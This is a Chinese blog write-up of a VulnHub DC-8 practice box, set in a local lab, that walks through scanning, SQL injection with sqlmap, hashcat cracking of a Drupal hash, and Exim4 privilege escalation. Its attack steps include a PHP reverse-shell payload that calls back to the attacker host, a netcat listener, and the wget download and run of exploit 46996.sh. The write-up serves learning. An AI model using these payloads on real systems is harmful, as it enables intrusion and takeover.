---
cover: /images/VulnHub.jpg
title: VulnHub DC-8 靶机渗透测试笔记
categories:
  - vulnhub-DC
tags:
  - 靶机渗透
  - VulnHub
  - vulnhub-DC
  - 提权
abbrlink: 16177df0
date: 2026-03-17 12:00:00# VulnHub DC-8 靶机渗透测试笔记

> **靶机信息**
> - 靶机名称：DC-8
> - 靶机来源：VulnHub
> - 目标：获取 root 权限，找到最终 flag
> - 难度：⭐⭐⭐⭐☆（中等偏难）
> - 涉及技术：信息收集、SQL注入、hashcat 哈希破解、PHP 反弹 Shell、Exim4 SUID 提权
> - https://www.cnblogs.com/wrold/p/19686607

---

## 一、信息收集

### 1.1 主机发现

```bash
ifconfig
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image1.png)

```bash
nmap -sn 192.168.168.0/24
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image2.png)

### 1.2 端口与服务扫描

```bash
nmap -A -p- 192.168.168.169
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image3.png)

依旧输入 IP 跳域名，Kali 和本机都改一下 hosts：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image4.png)

```bash
# Kali
echo "192.168.168.169 wordy" >> /etc/hosts

# Windows
# C:\Windows\System32\drivers\etc\hosts
# 添加：192.168.168.169 wordy
```

依旧老 CMS：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image5.png)

### 1.3 目录扫描

```bash
dirsearch -u http://wordy -x 404,403
```

> **`-x 404,403`** 的作用是排除「页面不存在」和「禁止访问」的结果，让输出更干净，不然一堆无用信息。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image6.png)

找到后台登录界面：`http://wordy/user`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image7.png)

---

## 二、SQL 注入

### 2.1 发现注入点

找到一个有输入框的地方：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image8.png)

测了几个地方，这几个按钮的 URL 地址是：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image9.png)

```
http://wordy/?nid=1
http://wordy/?nid=2
http://wordy/?nid=3
```



尝试在参数后加单引号测试：

```
http://wordy/?nid=3'
```

报错了！说明可能存在 SQL 注入：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image10.png)

> **判断注入的最简单方式：** 加单引号 `'` 看是否报错，报错基本就是有注入点。

### 2.2 sqlmap 跑注入

```bash
sqlmap -u "http://wordy/?nid=3" --dbs
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image11.png)

跑出来了，继续找数据库里的账号密码：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image12.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image13.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image14.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image15.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image16.png)

---

## 三、哈希破解

在线的 cmd5 解密找不到，自己爆破一下试试：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image17.png)

先确认哈希类型，查询 hashcat 哈希表：
- 参考：https://hashcat.net/wiki/doku.php?id=example_hashes
- ![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image18.png)

```bash
hashcat -m 7900 passwords.txt rockyou.txt
```

> **`-m 7900`** 对应的是 Drupal7 的哈希类型，不同 CMS 用的哈希算法不一样，要先确认类型再选对应的模式号。

破解出来了一个：

```
john / turtle
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image19.png)

---

## 四、登录后台 GetShell

### 4.1 登录后台

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image20.png)

### 4.2 发现 PHP 富文本功能

找到一个 PHP 富文本功能，可以直接写 PHP 代码：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image21.png)

先用 `<?php phpinfo();?>` 测试是否能执行：

需要先提交

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image22.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image23.png)

能执行！说明可以写反弹 Shell。

### 4.3 写入反弹 Shell（也可以用msf的）

```php
<?php 
    $sock = fsockopen("192.168.168.128", 5566); 
	$proc = proc_open("/bin/sh -i", array(0=>$sock,1=>$sock, 2=>$sock), $pipes); 
?>
```

Kali 监听：

```bash
nc -lvnp 5566
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image24.png)

升级为交互式终端：

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

用户目录什么都没有，去找提权方向：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image25.png)

---

## 五、提权

### 5.1 SUID 文件查找

```bash
find / -perm -u=s -type f 2>/dev/null
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image26.png)

发现 **exim4**，查看版本：

```bash
exim4 --version
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image27.png)

ai给出

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image28.png)

### 5.2 搜索 Exim4 漏洞

```bash
searchsploit exim 4
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image29.png)

查看脚本路径并复制到当前目录：

```bash
searchsploit -p 46996#查看
searchsploit -m 46996#复制
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image30.png)

### 5.3 传输 exp 到靶机

Kali 开启 HTTP 服务：

```bash
python3 -m http.server 8888
```

靶机下载：

```bash
wget http://192.168.168.128:8888/46996.sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image31.png)

当前目录无权限，切换到 `/tmp`：

```bash
cd /tmp
wget http://192.168.168.128:8888/46996.sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image32.png)

```bash
chmod 777 46996.sh
./46996.sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image33.png)

没有成功，查看源码让 AI 分析一下：

```bash
cat 46996.sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image34.png)

再次尝试./46996.sh -m netcat

```bash
./46996.sh -m netcat
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image35.png)

> **分析发现：** 这个 exp 获得的 root 权限是**临时的**，时间过了权限就变回去了。不过看 flag 已经足够了。反弹 Shell 试了不行，理论上写个 SUID 再提权应该可以，这里就不展开了。

最终取得 flag：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-8_image36.png)

---

## 六、渗透流程总结

```
信息收集（nmap + dirsearch）
    ↓
发现 nid 参数 → 单引号测试报错 → 确认 SQL 注入
    ↓
sqlmap 跑库 → 拿到哈希 → hashcat 破解 → john/turtle
    ↓
登录后台 → 发现 PHP 富文本 → 写入反弹 Shell
    ↓
nc 接收 shell → www-data
    ↓
SUID 发现 exim4 → searchsploit 找 exp → 46996.sh
    ↓
/tmp 下执行 → 临时 root → 读取 flag ✅
```

---

## 七、涉及工具汇总

| 工具 | 用途 |
|------|------|
| nmap | 端口扫描、服务识别 |
| dirsearch | Web 目录扫描（-x 过滤无效状态码） |
| sqlmap | 自动化 SQL 注入 |
| hashcat | GPU 加速哈希爆破 |
| nc | 反弹 Shell 监听 |
| searchsploit | 本地漏洞库搜索 |
| python3 http.server | 临时 HTTP 文件传输 |

---

> 本文为 VulnHub DC-8 靶机学习笔记，所有操作均在本地搭建的靶场环境中完成，仅用于学习交流。
